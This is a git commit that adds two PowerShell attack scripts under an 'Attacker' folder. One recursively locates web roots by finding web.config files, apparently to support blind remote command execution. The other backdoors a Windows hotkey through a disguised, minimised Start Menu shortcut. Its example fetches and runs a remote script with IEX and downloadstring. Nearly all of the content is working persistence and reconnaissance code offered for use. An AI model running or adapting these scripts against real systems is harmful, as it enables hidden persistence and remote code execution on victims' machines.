5e5cf76c8375e1c75f3892f7593b307a8c81b075
HUNTR <61641716+huntrpro@users.noreply.github.com>
2021-12-21 15:14:29 +0800

    Add files via upload

---
+++ Attacker/scripts/Find-Webroot.ps1
@@ -0,0 +1,2 @@
+# Usage and details - https://huntr.pro/posts/web-root-and-blind-remote-command-execution/
+(Get-PSDrive -PSProvider FileSystem).Root | ForEach-Object {(Get-ChildItem -Path $_ -Filter "web.config" -Recurse -ErrorAction SilentlyContinue -Force).DirectoryName | ForEach-Object {Out-File -FilePath "$_\\out.txt" -InputObject $_ -Force -ErrorAction SilentlyContinue}}
---
+++ Attacker/scripts/HotkeyHijack.ps1
@@ -0,0 +1,47 @@
+Function HotkeyHijack {
+
+    <#
+
+    .SYNOPSIS
+
+    Creates a shortcut file (.LNK) in the current user's start menu folder.
+    Hijacks given hotkey to run specified command.
+
+    .PARAMETER HotKey
+
+    Specifies the hotkey to hijack.
+
+    .PARAMETER Command
+
+    Specifies the command to execute.
+
+    .EXAMPLE
+    
+    By default, "CAPS LOCK" is backdoored to launch calculator. The "HotKey" parameter can be specified to execute a custom command.
+    Shown below is the command to backdoor "CTRL+V" to fetch a remote script - in this case, runs calculator.
+    
+    HotkeyHijack -HotKey "CTRL+V" -Command "IEX([net.webclient]::new().downloadstring('https://raw.githubusercontent.com/huntrpro/Cache/main/Attacker/scripts/calc.txt'))"
+
+    .NOTES
+    
+    More details at https://huntr.pro/posts/hijacking-windows-hotkeys/
+
+    #>
+
+    Param (
+        [Parameter(Mandatory = $False)]
+        [String] $HotKey = "Captial",
+        [String] $Command = '[Reflection.Assembly]::LoadWithPartialName(''System.Windows.Forms''); [Windows.Forms.SendKeys]::SendWait(\"^{CAPSLOCK}\"); Calc'
+        )
+
+    $outfile = "$env:UserProfile\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Network.lnk"
+    $wShell = New-Object -ComObject Wscript.Shell
+    $lnk = $wShell.CreateShortcut($outfile)
+    $lnk.IconLocation = "shell32.dll,18"
+    $lnk.WindowStyle = "7"
+    $lnk.TargetPath = "powershell"
+    $lnk.Arguments = "$Command"
+    $lnk.HotKey = "$HotKey"
+    $lnk.Save()
+
+}
